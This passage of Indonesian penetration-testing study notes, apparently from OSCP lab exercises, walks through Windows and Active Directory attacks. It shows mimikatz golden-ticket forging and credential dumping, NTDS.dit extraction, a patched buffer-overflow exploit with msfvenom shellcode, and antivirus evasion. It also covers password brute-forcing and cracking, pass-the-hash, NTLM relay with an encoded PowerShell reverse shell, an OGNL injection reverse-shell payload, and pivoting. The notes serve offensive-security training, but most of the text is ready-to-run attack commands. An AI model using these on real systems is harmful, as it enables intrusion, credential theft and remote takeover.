PsExec64.exe \\DC1 cmd.exe
```

Jadi kita perlu melakukan ekstraksi menggunakan mimikatz untuk mengambil hash krbtgt

```
privilege::debug
lsadump::lsa /patch
```

Setelah mendapat hash krbtgt kita bisa melakukan serangan kembali menggunakan mimikatz, tapi sebelum itu kita perlu mengosongkan ticket pada machine kita

```
kerberos::purge
```

dan payload fullnya 

```
//sid bisa diambil dari : whoami /user or Get-DomainController -LDAP | Select objectsid

kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt


//untuk aktifkan session cmd
misc::cmd
```

Yang jika kita verifikasi menggunakna psexec seharusnya berhasil

```
PsExec.exe \\dc1 cmd.exe

//verifikasi dengan 
whoami /groups
```

##### Shadow Copy

Shadow copy merupakan teknologi backup pada microsoft yang dapat digunakan untuk membuat suatu snapshot file atau volume. binary yang digunakan yaitu vshadow.exe dan kita dapat membuat shadow copy untuk melakukan ekstarksi file database active directory NTDS.dit dan hive system untuk mendapatkan semua hash user pada domain.


Command ini digunakan untuk disable writter untuk mempercepat proses pencadangan
```
vshadow.exe -nw -p  C:
```

Lalu lanjut untuk copy ke folder root C:
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak


//dan kemudian ekstrak hive system
reg.exe save hklm\system c:\system.bak

//setelah itu pindahkan pada local machine kita 
in kali : sudo impacket-smbserver share . -smb2support -user kali -password kali

in windows :
copy system.bak x:
copy ntds.dit.bak x:

```

kemudain extract menggunakan impacket-secretdump

```
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

##### Fixing exploit
Jadi disini kita akan belajar cara mempelajari untuk mempatching suatu public exploit. kebetulan disini ada semacam kerentanan buffer overflow pada software Sync Breeze Enterprise 10.0.28

```
searchsploit "Sync Breeze Enterprise 10.0.28"

//output: 
Sync Breeze Enterprise 10.0.28 - Remote Buffer Overflow (PoC) | windows/dos/42341.c


//kita bisa copy dengan :
searchsploit -m windows/dos/42341.c
```

karena format C, maka kita perlu melakukan cross compile menjadi executable menggunakan mingw

```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe

output:
/usr/bin/i686-w64-mingw32-ld: /tmp/cchs0xza.o:42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'
```

Terdapat kesalahan karena undefined WAStartup yang berarti linker tidak menemukan library winsock dan tinggal tambahkan opsi -lws2_32

```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

Beberapa hal perlu diubah agar exploit bekerja, sepert host, port dan beberapa hardcode lainnya. terutama pada bagian 

```
unsigned char retn[] = "\x83\x0c\x09\x10";
```
yang merupakan intruksi JMP ESP, intruksi ini berperan untuk melakukan jump ke register ESP yang jika kita timpa dengan address shellcode(awal stack sesuai dengan alamat ESP), maka program akan melakukan eksekusi pada shellcode kita alih alih berjalan normal.

generate menggunakan msfvenom dengan encode shikata_ga_nai dan menghapus bad char
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.237 LPORT=443 EXIFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

Setelah itu lanjut set breakpoint pada intruksi JMP ESP di 0x10090c83, dan jika kita run dengan 

```
sudo wine syncbreeze_exploit.exe
```
hasilnya breakpoint tidak pernah berhenti, ini berarti ada kesalah offset pada payload kita yang pada intruksi EIP akan melompat ke 0x9010090c, dan tampaknya offset kita kurang 1 byte ini karena fungsi seperti strcat akan mengatur karakter terakhit ke null byte yang pada akhirnya panjang payload kita ada 779.

yang perlu kita ubah yaitu dengan menambahkan 1 byte

```
    int initial_buffer_size = 781;
```

dan selanjutnya jika dieksekusi, maka payload akan bekerja

#### learn day 17


Jadi di module ini terkait dengan antivirus evasion, dan untuk prakteknya kita akan memakai beberapa pendekatan seperti melakukan bypass dengan powershell reflection maupun automation dengan shelter.

Contoh pertama kita akan menggunakan powershell, jadi kita bisa melakukan generate function powershell dengan msfvenom

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f psh-reflection
```

dan kemudian kita buat menggunakan serangkaian windows API

```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

function xf {
        Param ($nfCl, $vf)
        $uaQP = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $uaQP.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($uaQP.GetMethod('GetModuleHandle')).Invoke($null, @($nfCl)))), $vf))
}

function xb {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $jGN_b,
                [Parameter(Position = 1)] [Type] $hh = [Void]
        )
```

Dan jika denied, kita bisa set policy saat ini :

```
Get-ExecutionPolicy -Scope CurrentUser

//set policy
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser

//set to unristrected 
Get-ExecutionPolicy -Scope CurrentUser

//lalu jalankan 
.\bypass.ps1
```


##### Automation processs
Disini kita juga bisa menggunakan shelter untuk melakukan automation.


install dan use
```
sudo apt install shellter

sudo apt install wine
sudo dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
```


#### Password attack

Disini kita akan belajar terkait password attack, jadi tekniknya cukup umum seperti dengan melakukan brute force service maupun crack hash.


Contoh serangan ssh menggunakan hydra

```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.107.201

//using list
hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.107.201

//huruf besar untuk list dan kecil untuk word
```


#### RDP 

Kita akan belajar terkait password spraying disini. jadi ada banyak cara untuk mendapatkan suatu password, bahkan banyak service / platform untuk melakukan checking password yang bocor dan mendapatkannya seperti pada https://scatteredsecrets.com/

Spray password berarti, kita menggunakan satu set password yang sama dari kumpulan username, contohnya : 

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```


#### HTTP

Saat melakukan pentest, kita akan banyak berhadapan dengan website / http, jadi kita bisa memanfaatkan form data dan melakukan brute force.

contoh command : 
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"


//https 
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 https-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

Contoh diatas kita menggunakan username "user" dan password yang diambil dari rockyou.txt, lalu pada bagian terakhir :, merupakan acuan saat kata sandi salah yang berarti kita bisa menyesuaikan hal tsb

#### Learn day 18

Masih di module password attack, jadi kita akan mempelajari lebih dalam lagi tentang teori maupun prakteknya.

disini kita belajar mengenali perbedaan dari encryption, hash dan cracking. kita bahas dasar enkripsi, dan enkripsi merupakan fungsi 2 arah yang bisa dilakukan pengacakan dan penyusunan ulang menggunakan setidaknya 1 kunci. Daya yang di enkripsi disebut cipher text.

2 jenis enkripsi yaitu :
- asymetric : menggunakan kunci private / public
- symetric : menggunakan 1 kunci

Disisi lain ada hash / digest yang merupakan output dari suatu plaintext yang diolah melalui serangkaian algoritma(md5, sha1, bcrypt dll) dengan hasil nilai hexa dengan panjang tetap/static.

contoh hash dengan sha256 :

```
echo -n "secret" | sha256sum


//output hash berbeda jika string yang di input berbeda
echo -n "secret1" | sha256sum
```

2 tools powerfull untuk melakukan cracking kita bisa menggunakan john the ripper dan hashcat, tapi sebelum kita melakukan cracking, kita perlu kalkulasi waktu cracking dari representasi hashnya. Sebagai contoh, jika kita menggunakan password dengan kemungkinan alfabet huruf besar dan kecil yang berarti 26 x 2 + angka 0 - 9 berarti 62

dimana 62 ini dipangkatkan dengan kemungkinan length password. yang berarti :

```
echo -n "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" | wc -c

python3 -c "print(62**5)"
//output: 916132832
```

untuk 5 character sendiri kita memiliki keyspace 916132832, setelah itu kita membutuhkan hashrate(ukuran perhitungan hash dalam 1 detik) untuk menghitung waktu cracking.

menggunakan hashcat dengan opsi -b

```
hashcat -b
```

comman ini merupakan benchmarking untuk menampilkan speed hash pada hashcat dengan contoh md5 

```
-------------------
* Hash-Mode 0 (MD5)
-------------------

Speed.#1.........: 47815.2 kH/s (17.04ms) @ Accel:256 Loops:1024 Thr:1 Vec:8

```
speed ditunjukkan pada hH/s atau MH/s dimana MH/s sama dengan 1.000.000 hash per detik, jadi perhitungannya adalah keyspace / hashrate

misalkan : 

```

python3 -c "print(916132832 / 134200000)"
//output: 6.826623189269746

python3 -c "print(916132832 / 9276300000)"
//output:  0.09876058687192092
```

Disini output 1, menunjukkan hash bisa dipecahkan dalam waktu sekitar 7 detik dan output 2 menunjukkan hash pecah dalam waktu kurang dari 1 detik



#### Mutating wordlist

rule-based attack, dimana attacker memodifikasi wordlist sesuai dengan aturan yang ditentukan. Terkadang beberapa platform / layanan seringkali menerapkan password policy jadi pengguna diharuskan menggunakan password dari serangkaian character huruf besar maupun angka.

Menggunakan hashcat, kita bisa menambahkan rule kita sendiri

```
echo \$1 > demo.rule
```

Disini kita menambahkan character 1 pada akhir password

```
hashcat -r demo.rule --stdout pass.txt 

//output: 
password1
iloveyou1
princess1
rockyou1
abc1231
```

Kita juga bisa agar password, pada awal character menggunakan kapital menggunakan rule 'c'

```
cat demo1.rule                                                

//output:
$1 c

hashcat -r demo1.rule --stdout pass.txt

//output:
Password1
Iloveyou1
Princess1
Rockyou1
Abc1231
```

dan bisa juga menambahkan special character seperti !, contoh

```
cat demo1.rule

//output : $1 c $!

hashcat -r demo1.rule --stdout demo.txt
Password1!
Iloveyou1!
Princess1!
Rockyou1!
Abc1231!
```
Kita juga bisa membuat lebih dari 1 line rule seperti :

```
$1 c $!
$2 c $!
$1 $2 $3 c $!
```

artinya kita membuat 3 rule dan password kita akan dilakukan permutation. 

setelah itu execute 

```
hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
```

atau kita juga bisa menggunakan rule khusus yang disediakan hashcat pada file 

```
ls -la /usr/share/hashcat/rules/
```


selanjutnya, sebelum melakukan cracking kita perlu mengerti dulu jenis hash yang digunakan

```
//menggunakan hashid
hashid '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'

//menggunakan hash-identifier
hash-identifier '4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7'
```


##### Password manager
Selanjutnya kita akan belajar terkait password manager, umumnya di windows sendiri file credential password manager menggunakan ekstensi kdbx

contoh untuk mencari rekursif

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

Lalu jika ditemukan, pindah pada machine kali kita dan selanjutkan kita perlu melakukan konversi ke hash yang dapat dibaca menggunakan ssh2john atau keepass2john

```
keepass2john Database.kdbx > keepass.hash

cat keepass.hash                                              
//output
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1

//remove string "Database"
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```

selanjutnya cari type pada hashcat 

```
hashcat --help | grep -i "KeePass"
```

selanjutnya lakukan execute 

```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

//rule bisa diubah sesuai kebutuhan
```


#### passphrase private key SSH

pada banyak kasus, private key ssh ditambahkan passphrase jadi untuk menggunakannya kita perlu mengerti passphrase yang digunakan

contohnya seperti ini 

```
ssh -i id_rsa dave@192.168.174.201 -p 2222
The authenticity of host '[192.168.174.201]:2222 ([192.168.174.201]:2222)' can't be established.
ED25519 key fingerprint is SHA256:SxEapuin3GJsdhOqDdFrm+ncv8/8UU+a8npW7OKfREk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.174.201]:2222' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
```

yang dimana key meminta input passphrase dan disini kita bisa menggunakan john untuk melakukan ekstraksi hash

```
ssh2john id_rsa > ssh.hash
```

file disimpan pada ssh.hash, sekarang lanjut analisis file note.txt yang kita temukan diserver 

```
Dave's password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
```
Password policy bisa kita buat sendiri berdasarkan file notes.txt dengan klasifikasi berikut:
- ada tambahan angka 137
- password  Window dimulai menggunakan upper case
- dan ada catatan special char jadi kita akan menggunakan (!, @, #)

jadi rulesnya seperti berikut: 

```
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

jika kita menggunakan hashcat seperti 
```
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
```

maka akan terdapat kesalahan, intinya hashcat mode 22921 tidak support pada hash ssh kita jadi kita akan menggunakan john the ripper untuk ini

kita buat rules untuk john the ripper

```
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

selanjutnya, kita akan menginputkan di file /etc/john/john.conf agar rule bisa kita load

```
sudo sh -c 'cat /home/kali/oscp/password-cracking/ssh.rules >> /etc/john/john.conf'

//run 
john --wordlist=ssh-pass.txt --rules=sshRules ssh.hash
```

setelah itu login ssh dan masukan passphrase

```
ssh -i id_rsa dave@192.168.174.201 -p 2222
```



##### Working with password hash

pada unit ini kita akan belajar bagaimana mendapatkan hash dan menggunakan hash untuk mendapatkan akses ke system lain pada operating system windows.

Windows menyimpan password dan credential pada file SAM(Security Account Manager) yang digunakan untuk authentikasi user local dan remote. NTLM juga disimpan pada database SAM

SALT merupakan bit random yang ditambahkan pada password sebelum di hash. jadi di unit ini kita akan menggunakan mimikatz untuk melakukan ekstraksi hash. mimikatz melakukan ekstraksi dari berbagai sumber windows, salah satunya LSASS yang merupakan process untuk menghandle authentikasi user, password update dan pembuatan token akses . Penggunaan mimikatz harus dijalankan pada user administrator atau privilege tinggi.

command untuk dump SAM
```
.\mimikatz.exe

//mode debug dan cek privilege 
privilege::debug

//untuk meningkatkan ke privilge system
token::elevate

//lanjut dump sam
lsadump::sam
```

selanjutnya cek hash mode pada hashcat untuk lanjut cracking

```
hashcat --help | grep -i "ntlm"

//output di 1000
```

lalu lakukan cracking 
```
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


#### Pass the Hash

Selanjutnya kita akan menggunakan pass the hash. jadi tanpa password plain-text, kita bisa melakukan auth hanya dengan hash NTLM. 

Beberapa tools dan command yang digunakan untuk melakukan pass-the-hash attack

```
smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b

impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212

impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
```

perbedaan besarnya pada psexec dan wmiexec yaitu jika pada psexec kita akan selalu mendapatkan shell interaktif sebagai system, tapi pada wmiexec kita mendapatkan shell sebagai user yang sesuai pada saat authentikasi.


#### NTLMv2
pada banyak kasus, kita tidak bisa melakukan ekstraksi hash dan menjalankan mimikatz karena bukan privilege tinggi. Alternatifnya, kita bisa memanfaatkan protokol network authentication(_Net-NTLMv2_) 

dasar proses authentikasi client dan server melalui Net-NTLMv2:
- client mengirimkan request ke server untuk akses SMB
- server meresponse "challenge" ke client
- client melakukan enkripsi data dengan hash NTLM
- server validasi response challenge apakah diizinkan atau ditolak

Disini kita bisa menyalahgunakan dengan meniru service yang sesuai dan meminta server untuk melakukan authentikasi menggunakan protocol NTLM, yang kemudian kita bisa menangkap hashnya.

Disini kita akan menggunakan responder, dengan skenario berikut

kita punya akses reverse shell pada user paul pada privilege rendah, tapi paul ini masuk ke group remote desktop user. jadi untuk mendapatkan NTLM hashnya kita perlu setup service tiruan kita pada host local menggunakan responder

```

//interface disesuakan
sudo responder -I tun0

//pada shell paul dan IP disesuakan
C:\Windows\system32>dir \\192.168.45.161\test
```

Cek output responder, seharusnya NTLM berhasil di capture lalu lanjut cracking hashcat
```
//cek mode
hashcat -hh | grep -i "ntlm"

//cracking
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

##### Relai NTLM

sebagian besar kasus, hash NTLM tidak bisa dilakukan cracking dan jika skenarionya seperti itu kita bisa juga mencoba memanfaatkan serangangan relay NTLM. Jadi cara kerjanya seperti ini :

- attacker setup relay NTLM
- attacker menjalankan auth NTLM(dir \\ip\test)
- alih alih hanya meresponse hash, request akan diteruskan ke service lain
- jika authentikasi berasal dari admin, kita juga bisa melakukan command pada psexec dan wmiexec


jadi disini kita akan menggunakan ntlmrelayx pada module impacket dan melakukan eksekusi reverse shell.

pertama kita generate payload revshellnya

```
python3 generate-revshell.py 192.168.45.161192.168.45.161 443
```

lalu jalankan ntlmrelayx dengan opsi -t IP yang merupakan host2 atau dengan kata lain request kita akan di forward ke IP 192.168.174.211
```
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.174.211 -c "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

selanjutnya jalankan revshell pada port 443

```
nc -lnvp 443
```

lalu pada host 1, komunikasikan dengan host kita yang sudah running ntlmrelayx

```
dir \\192.168.45.161\test
```
seharusnya, listener kita menerima koneksi shell pada host2



##### Windows credential guard

kita diatas belajar terkait hash pada akun local. namun pada saat melakukan penetration testing, kita akan menemukan jenis akun lain misalkan akun user dalam domain. Jika pada local semua informasi akun disimpan pada SAM sementara pada domain, informasi akun disimpan dalam proses lsass.exe.

Mimikatz bisa melakukan dump hash dari user domain, dengan syarat pengguna domain pernah masuk pada host yang akan kita jalankan mimikatz, sebagai contoh kita akan masuk sebagai administrator pada host client26

```
xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.174.248 /sec:nla /dynamic-resolution
```

setelah itu logout dan ganti user offsec(admin local)

```
xfreerdp3 /u:offsec /p:lab /v:192.168.174.246 /sec:nla /dynamic-resolution
```
Karena sebelumnya administrator sudah login pada client26, selanjutnya kita jalankan mimikatz untuk melakukan dump

```
C:\tools\mimikatz\mimikatz.exe

privilege::debug
sekurlsa::logonpasswords
```

Seharusnya bagian output menunjukkan NTLM dari administrator beserta informasi logon server.

dan kita bisa menggunakan wmiexec untuk terhubung ke server

```
impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.174.248
```

Teknik ini sebenarnya sudah dilakukan mitigasi oleh microsoft, yaitu dengan menerapkan Virtualization-Based Security/VBS yang merupakan teknologi virtualisasi hardware yang disediakan oleh CPU dengan fitur untuk melakukan isolasi wilayah memory.

VBS menjalankan hypervisor pada hardware bukan pada operating system dan di implementasikan melalui hyper-v(hypervisor asli microsoft) dan selain itu, microsoft juga mengembangkan VSM(Virtual Secure Mode) yang merupakan kemampuan pada partisi hyper-v

VSM menciptakan area terisolasi di memory yang menyimpan info sensitive, dan area ini hanya dapat diakses melalui hypervisor yang berjalan pada hak akses sangat tinggi daripada kernel. Artinya meskipun privilege kita nt system, tetap saja kita tidak bisa mengakses area tersebut

VSM membagi isolasi melalui beberapa level VTL(Virtual Trust Level), dan tiap vtl memiliki tiap bagian area memory dan saat ini mempunyai 16 level VTL-1 sampai VTL-16

Di module ini kita akan fokus pada mitigasi credential guard. saat diaktifkan, LSASS berjalan sebagai trustlet di VTL1 dengan nama LSAISO.exe(LSA ISOLATED) yang berkomunikasi dengan LSASS pada VTL0 melalui RCP.

mimikatz menelususri lsass.exe untuk dumping semua informasi credential, tapi saat credential guard aktif semua process baru disimpan pada VTL-1 bukan lsass.exe, artinya kita tidak bisa melakukan dump karena terisolasi 

untuk identifikasi, kita bisa menggunakan command : 

```
Get-ComputerInfo
```
Apakah terdapat string seperti 

```
DeviceGuardSecurityServicesConfigured: {CredentialGuard, HypervisorEnforcedCodeIntegrity, 3}
DeviceGuardSecurityServicesRunning : {CredentialGuard, HypervisorEnforcedCodeIntegrity}
```

Jika ada, berarti target sudah menerapkan credential guard dan jika kita running mimikatz maka kita tidak akan melihat hash yang dicache. Tapi pentingnya, credential guard hanya melindungi user non-local jadi kita masih bisa melakukan dump pada user local.

Jadi cara satu satunya bukan melakukan dump, tapi melakukan intercept user yang login ke server, yaitu dengan memanfaatkan mekanisme auth SSPI(Security Support Provider Interface) dan secara default, windows menyediakan SSP seperti kerberos security support provider dan ntlm security support provider dan SSP diintegrasikan ke dalam SSPI sebagai DLL.

Jika kita mengembangkan SSP sendiri dan register ke LSASS, kemungkinan bisa memaksa SSPI untuk menggunakan DLL security support provider berbahaya kita untuk auth.

untungya mimikatz menyediakan hal ini melalui memssp, jadi kita bisa intercept plain-text user yang login.

pada user offsec :

```
privilege::debug

//untuk melakukan inject SSP
misc::memssp
```

Jadi kita hanya perlu menunggu seseorang melakukan authentikasi, anggaplah case kali ini administrator melakukan koneksi RDP
```
xfreerdp /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.50.245 /dynamic-resolution
```

Setelah itu, kredensial akan disimpan di file log

```
C:\Windows\System32\mimilsa.log

//read 
type C:\Windows\System32\mimilsa.log

//output:
Nz*N;DVtP+G]imZ_6MBkb:#Wq&8eo/fU@eBq+;CXt
[00000000:00af2311] CORP\Administrator  QWERTY123!@#
[00000000:00404e84] CORP\Administrator  Šd
[00000000:00b16d69] CORP\CLIENTWK245$   R3;^LTW*0g4o%bQo1M[L=OCDDR>%$ 
```

Disini kita berhasil mendapatkan password administrator melalui memssp pada mimikatz

#### Learn day 19
Akhirnya bisa belajar kembali pada module offsec, hari ini kita akan belajar di module port redirection dan ssh tunneling. Jadi kali ini kita akan explore terkait module ini


pertama kita diberikan suatu instance IP dimana terdapat service yang running di port 8090, dan setelah dilakukan enumeration ternyata rentan OGNL injection, jadi kita bisa execute payload seperti ini untuk reverse shell

```
${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

yang jika kita lakukan curl dan encoding url akan seperti ini 
```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.166/443%200%3E%261%27%29.start%28%29%22%29%7D/
```

jangan lupa aktifkan listener 

```
nc -lnvp 443
```

lalu, jika sudah berhasil kita bisa melihat file /var/atlassian/application-data/confluence/confluence.cfg.xml yang berisi suatu credential untuk psql

```
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.172.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>

```

tapi problemnya adalah, kita tidak bisa langsung connect ke IP melalui machine attacker maka dari itu kita perlu melakukan port forwarding menggunakan socat. 

```
socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
```

jadi kita akan redirect traffic dari port 2345 pada machine yang compromised ke IP internal 10.4.50.215. Jadi kita bisa langsung login dengan command 

```
psql -h 192.168.172.63 -p 2345 -U postgres
```

Jika terdapat input, masukan password yang kita dapatkan. Selanjutnya kita cek database dan melihat isi table cwd_user

```

//untuk cek db
\l

//masuk pada db confluence
\c confluence

//untuk describe table cwd_user
\d cwd_user

//select data pada table cwd_user
select * from cwd_user

//or kita hanya ingin column tertentu aja
select credential from cwd_user;

```
Setelah mendapatkan passwordnya, kita bisa melakukan cracking menggunakan hashcat pada mode 12001

```
hashcat -m 12001 pass_hash.txt /usr/share/wordlists/fasttrack.txt  
```

Disini kita berhasil melakukan cracking dengan hashcat, selanjutnya kita lakukan login ssh dengan credential dari hash password tersebut dengan username database_admin. Jadi kita perlu set port forwarding pada port 22 di postgres machine yang diakses dari machine external di port 2222

```
socat -ddd TCP-LISTEN:2222,fork TCP:10.4.172.215:22
```

Selanjutnya login ssh dengan credential database_admin:sqlpass123 dan ambil flag pada /tmp/socat_flag.



Jika kita dihadapkan skenario saat di server yang kita lakukan pentest tidak ada tools internal, alternatif cara cepat untuk melakukan enumeration yaitu port scanning dengan bash script seperti berikut
```
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```

##### SSH Local port forwarding 

Anggaplah kita mempunyai suatu akses pada machine yang menghubungkan dari external kedalam DMZ network, dan kita ingin melakukan akses pada machine internal melalui machine yang sudah kita compromised jadi kita bisa melakukan ssh local port forwarding. dan dalam contoh kasus dibawah ini, kita akan menghubungkan IP local 172.16.50.217 pada port 445 agar smb dapat diakses pada 192.168.172.63 di port 4455
```

//di IP 
ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
```

Setelah dilakukan local port forwarding, kita bisa langsung melakukan akses pada machine external dengan port 4455 yang kita tentukan dan akan di forward ke 172.16.50.217 di port 445


```
//listing directory / shares
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234

//Connect to specific share
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
```


#### SSH Dynamic port forwarding
port forward sebenarnya memiliki keterbatasan, yaitu kita hanya bisa koneksi pada 1 socket saja. Solusinya yaitu dengan melakukan dynamic port forwarding dengan menggunakan socks proxy dan dengan cara ini seharusnya akan lebih flexible. Disini, SSH akan menjadi listener socks yang kemudian kita akan konfigurasi menggunakan proxychains yang melakukan bind pada address dan port listener SSH.

